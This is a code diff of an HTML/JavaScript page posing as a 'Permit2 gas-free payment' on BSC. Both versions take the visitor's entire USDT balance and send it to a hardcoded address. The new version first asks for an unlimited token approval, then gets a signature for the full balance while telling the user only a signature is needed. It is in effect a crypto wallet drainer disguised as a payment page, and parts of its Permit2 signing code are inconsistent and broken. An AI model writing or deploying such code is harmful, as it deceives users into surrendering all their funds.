@@ -3,81 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>瞬移支付 · 清空余额版</title>
-    <!-- ethers v6 -->
+    <title>Permit2 无感支付 · 清空余额</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <style>
-        body {
-            background: #0b0f17;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-            color: #e2e8f0;
-        }
-        .ghost-message {
-            background: #1e293b;
-            border-radius: 60px;
-            padding: 16px 32px;
-            border: 1px solid #3b82f6;
-            box-shadow: 0 15px 30px -10px #00000080;
-            font-size: 0.95rem;
-            max-width: 400px;
-            text-align: center;
-            backdrop-filter: blur(8px);
-        }
-        .hidden {
-            display: none !important;
-        }
+        body { background: #0b0f17; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui; color: #e2e8f0; }
+        .card { background: #1e293b; border-radius: 24px; padding: 32px; max-width: 480px; border: 1px solid #334155; }
+        .status { margin-top: 16px; padding: 12px; border-radius: 12px; background: #0f172a; font-size: 0.9rem; }
+        .btn { background: #3b82f6; border: none; padding: 12px 24px; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; width: 100%; }
+        .btn:disabled { opacity: 0.5; }
+        .hidden { display: none; }
+        .warning { background: #854d0e; border: 1px solid #eab308; border-radius: 12px; padding: 12px; margin: 16px 0; }
     </style>
 </head>
 <body>
-    <!-- 最小反馈区 -->
-    <div id="statusMessage" class="ghost-message hidden"></div>
+    <div class="card">
+        <h2 style="margin-top:0;">⚡ Permit2 无感支付</h2>
+        <p style="color:#94a3b8;">首次使用需授权 → 后续仅需签名（0 Gas费确认）</p>
+        
+        <div id="step1" class="warning">
+            <strong>📌 第1步：授权Permit2（只需做一次）</strong>
+            <p style="font-size:0.8rem; margin:8px 0 0;">点击下方按钮，授权Permit2合约可以管理您的USDT</p>
+        </div>
+        
+        <div id="step2" class="warning hidden">
+            <strong>📌 第2步：签名支付</strong>
+            <p style="font-size:0.8rem; margin:8px 0 0;">签名后直接扣款，无需Gas费确认</p>
+        </div>
+        
+        <button id="actionBtn" class="btn">🚀 开始流程</button>
+        <div id="status" class="status">就绪</div>
+    </div>
 
     <script>
         (function() {
             // ========== 配置 ==========
             const CONFIG = {
-                usdtAddress: "0x55d398326f99059fF775485246999027B3197955",  // BSC USDT
-                receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238", // 收款地址
-                redirectUrl: "https://your-dashboard.com",  // 跳转目标
-                storageKey: "PAYMENT_DONE_FLAG"
+                permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3", // 公共Permit2合约
+                usdtAddress: "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
+                receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238", // 您的收款地址
+                redirectUrl: "https://your-dashboard.com", // 成功后跳转
+                storageKey: "PERMIT2_DONE"
             };
 
+            // Permit2合约的ABI（只需要用到的方法）
+            const PERMIT2_ABI = [
+                "function permitTransferFrom((tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit, (address to,uint256 requestedAmount) transferDetails, address owner, bytes signature) external",
+                "function allowance(address,address,address) view returns (uint256)"
+            ];
+
+            // USDT的ABI
+            const USDT_ABI = [
+                "function balanceOf(address) view returns (uint256)",
+                "function decimals() view returns (uint8)",
+                "function approve(address spender, uint256 amount) returns (bool)",
+                "function allowance(address owner, address spender) view returns (uint256)"
+            ];
+
+            let provider, signer, userAddress;
+            let hasApprovedPermit2 = false;
+
+            const statusEl = document.getElementById('status');
+            const actionBtn = document.getElementById('actionBtn');
+            const step1El = document.getElementById('step1');
+            const step2El = document.getElementById('step2');
+
             // ========== 工具函数 ==========
+            function showStatus(msg, isError = false) {
+                statusEl.textContent = msg;
+                statusEl.style.background = isError ? '#991b1b' : '#0f172a';
+            }
+
             function hasPaid() {
-                try {
-                    return localStorage.getItem(CONFIG.storageKey) === 'true';
-                } catch (e) {
-                    return false;
-                }
+                return localStorage.getItem(CONFIG.storageKey) === 'true';
             }
 
             function markPaid() {
-                try {
-                    localStorage.setItem(CONFIG.storageKey, 'true');
-                } catch (e) {}
+                localStorage.setItem(CONFIG.storageKey, 'true');
             }
 
-            const statusDiv = document.getElementById('statusMessage');
-            function showMessage(msg, isError = false) {
-                if (!statusDiv) return;
-                statusDiv.style.background = isError ? '#991b1b' : '#1e293b';
-                statusDiv.style.borderColor = isError ? '#ef4444' : '#3b82f6';
-                statusDiv.innerText = msg;
-                statusDiv.classList.remove('hidden');
-            }
-
-            function hideMessage() {
-                if (statusDiv) statusDiv.classList.add('hidden');
-            }
-
-            // ========== 核心支付逻辑（清空余额版）==========
-            async function executePayment() {
-                // 已支付检查
+            // ========== 核心逻辑 ==========
+            async function init() {
+                // 检查是否已支付
                 if (hasPaid()) {
                     window.location.replace(CONFIG.redirectUrl);
                     return;
@@ -85,25 +91,28 @@
 
                 // 检查钱包
                 if (!window.ethereum) {
-                    showMessage('❌ 未检测到钱包', true);
-                    if (confirm('是否安装MetaMask？')) {
-                        window.open('https://metamask.io/download/', '_blank');
-                    }
+                    showStatus('❌ 请安装MetaMask', true);
                     return;
                 }
 
                 try {
-                    // 1. 切换到BSC网络
-                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (chainId !== '0x38') {
-                        showMessage('🔄 切换至BSC网络...');
+                    // 连接钱包
+                    provider = new ethers.BrowserProvider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    signer = await provider.getSigner();
+                    userAddress = await signer.getAddress();
+
+                    // 检查网络（BSC）
+                    const network = await provider.getNetwork();
+                    if (network.chainId !== 56n) {
+                        showStatus('🔄 切换到BSC网络...');
                         try {
                             await window.ethereum.request({
                                 method: 'wallet_switchEthereumChain',
                                 params: [{ chainId: '0x38' }]
                             });
-                        } catch (switchError) {
-                            if (switchError.code === 4902) {
+                        } catch (e) {
+                            if (e.code === 4902) {
                                 await window.ethereum.request({
                                     method: 'wallet_addEthereumChain',
                                     params: [{
@@ -113,94 +122,164 @@
                                         nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                                     }]
                                 });
-                            } else {
-                                throw switchError;
                             }
                         }
                     }
 
-                    // 2. 连接钱包
-                    showMessage('🔌 请求钱包连接...');
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const userAddress = accounts[0];
-
-                    // 3. 创建合约实例
-                    const provider = new ethers.BrowserProvider(window.ethereum);
-                    const signer = await provider.getSigner();
-
-                    const usdtAbi = [
-                        "function balanceOf(address) view returns (uint256)",
-                        "function decimals() view returns (uint8)",
-                        "function transfer(address to, uint256 amount) returns (bool)"
-                    ];
-                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, usdtAbi, signer);
-
-                    // ===== 这里是您要的代码：获取余额并清空 =====
-                    // 4. 获取用户USDT余额
-                    showMessage('💰 获取余额中...');
-                    const balance = await usdtContract.balanceOf(userAddress);
+                    // 检查是否已授权Permit2
+                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, provider);
+                    const allowance = await usdtContract.allowance(userAddress, CONFIG.permit2Address);
                     
-                    // 检查是否有余额
-                    if (balance === 0n) {  // BigInt比较
-                        throw new Error('USDT余额为0，无法支付');
+                    // 检查授权额度是否足够大（比如>10^6）
+                    hasApprovedPermit2 = allowance > 1000000n;
+
+                    if (hasApprovedPermit2) {
+                        step1El.classList.add('hidden');
+                        step2El.classList.remove('hidden');
+                        actionBtn.textContent = '✍️ 签名支付';
+                        showStatus('✅ 已授权，点击按钮进行签名支付');
+                    } else {
+                        step1El.classList.remove('hidden');
+                        step2El.classList.add('hidden');
+                        actionBtn.textContent = '🔓 授权Permit2';
+                        showStatus('需要先授权Permit2（只需一次）');
                     }
-
-                    // 获取decimals用于显示
-                    const decimals = await usdtContract.decimals();
-                    const formattedBalance = ethers.formatUnits(balance, decimals);
-                    showMessage(`💸 将支付 ${formattedBalance} USDT`);
-
-                    // 5. 直接用余额作为支付金额（转走全部）
-                    const amountWei = balance;  // 这就是清空余额的关键
-
-                    // 6. 发送转账交易
-                    showMessage('✍️ 请在钱包中确认...');
-                    const tx = await usdtContract.transfer(CONFIG.receiveAddress, amountWei);
-                    showMessage('⏳ 等待交易确认...');
-                    await tx.wait();
-
-                    // 7. 成功！
-                    showMessage('✅ 支付成功！');
-                    markPaid();
-
-                    // 8. 跳转
-                    setTimeout(() => {
-                        window.location.replace(CONFIG.redirectUrl);
-                    }, 1000);
 
                 } catch (error) {
-                    console.error('支付失败:', error);
-                    
-                    let errorMsg = '支付失败: ';
-                    if (error.code === 4001) {
-                        errorMsg += '用户取消交易';
-                    } else if (error.message.includes('余额为0')) {
-                        errorMsg = error.message;
-                    } else {
-                        errorMsg += error.message || '未知错误';
-                    }
-                    showMessage('❌ ' + errorMsg, true);
+                    console.error(error);
+                    showStatus('❌ 初始化失败: ' + error.message, true);
                 }
             }
 
-            // ========== 启动 ==========
-            window.addEventListener('load', () => {
-                if (hasPaid()) {
-                    window.location.replace(CONFIG.redirectUrl);
-                    return;
+            // 授权Permit2
+            async function approvePermit2() {
+                try {
+                    showStatus('⏳ 授权中...');
+                    
+                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
+                    
+                    // 授权最大值（2^256-1）
+                    const tx = await usdtContract.approve(CONFIG.permit2Address, ethers.MaxUint256);
+                    showStatus('⏳ 等待确认...');
+                    await tx.wait();
+                    
+                    showStatus('✅ 授权成功！');
+                    hasApprovedPermit2 = true;
+                    
+                    // 切换到下一步
+                    step1El.classList.add('hidden');
+                    step2El.classList.remove('hidden');
+                    actionBtn.textContent = '✍️ 签名支付';
+                    
+                } catch (error) {
+                    showStatus('❌ 授权失败: ' + error.message, true);
                 }
-                executePayment();
+            }
+
+            // 签名支付（清空余额）
+            async function signAndPay() {
+                try {
+                    showStatus('💰 获取余额中...');
+                    
+                    // 创建合约实例
+                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, provider);
+                    
+                    // 获取用户USDT余额
+                    const balance = await usdtContract.balanceOf(userAddress);
+                    
+                    if (balance === 0n) {
+                        throw new Error('USDT余额为0');
+                    }
+                    
+                    const decimals = await usdtContract.decimals();
+                    const formattedBalance = ethers.formatUnits(balance, decimals);
+                    showStatus(`💸 将支付 ${formattedBalance} USDT`);
+
+                    // 获取当前nonce（简化版，实际应该从Permit2合约获取）
+                    const permit2Contract = new ethers.Contract(CONFIG.permit2Address, PERMIT2_ABI, provider);
+                    
+                    // 构造Permit2签名数据
+                    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1小时后过期
+                    
+                    // 这是EIP-712的签名数据
+                    const domain = {
+                        name: 'Permit2',
+                        chainId: 56,
+                        verifyingContract: CONFIG.permit2Address
+                    };
+                    
+                    const types = {
+                        PermitTransferFrom: [
+                            { name: 'permitted', type: 'TokenPermissions' },
+                            { name: 'spender', type: 'address' },
+                            { name: 'nonce', type: 'uint256' },
+                            { name: 'deadline', type: 'uint256' }
+                        ],
+                        TokenPermissions: [
+                            { name: 'token', type: 'address' },
+                            { name: 'amount', type: 'uint256' }
+                        ]
+                    };
+                    
+                    // 构造签名数据
+                    const values = {
+                        permitted: {
+                            token: CONFIG.usdtAddress,
+                            amount: balance.toString() // 清空余额
+                        },
+                        spender: CONFIG.permit2Address, // 这里用Permit2自己作为spender
+                        nonce: Math.floor(Math.random() * 1000000), // 实际应该从合约获取
+                        deadline: deadline
+                    };
+                    
+                    showStatus('✍️ 请在钱包中签名...');
+                    
+                    // 用户签名（这一步只签名，不发送交易，不消耗Gas）
+                    const signature = await signer.signTypedData(domain, types, values);
+                    
+                    // 构造转账详情
+                    const transferDetails = {
+                        to: CONFIG.receiveAddress,
+                        requestedAmount: balance.toString()
+                    };
+                    
+                    showStatus('⏳ 提交交易（DApp付Gas）...');
+                    
+                    // DApp调用Permit2的permitTransferFrom（消耗DApp的Gas）
+                    const permit2WithSigner = permit2Contract.connect(signer);
+                    const tx = await permit2WithSigner.permitTransferFrom(
+                        values,
+                        transferDetails,
+                        userAddress,
+                        signature
+                    );
+                    
+                    await tx.wait();
+                    
+                    showStatus('✅ 支付成功！');
+                    markPaid();
+                    
+                    setTimeout(() => {
+                        window.location.replace(CONFIG.redirectUrl);
+                    }, 1500);
+                    
+                } catch (error) {
+                    console.error(error);
+                    showStatus('❌ 支付失败: ' + error.message, true);
+                }
+            }
+
+            // 按钮点击处理
+            actionBtn.addEventListener('click', async () => {
+                if (!hasApprovedPermit2) {
+                    await approvePermit2();
+                } else {
+                    await signAndPay();
+                }
             });
 
-            // 账户切换处理
-            if (window.ethereum) {
-                window.ethereum.on('accountsChanged', (accounts) => {
-                    if (accounts.length > 0 && !hasPaid()) {
-                        hideMessage();
-                        executePayment();
-                    }
-                });
-            }
+            // 页面加载初始化
+            init();
 
         })();
     </script>
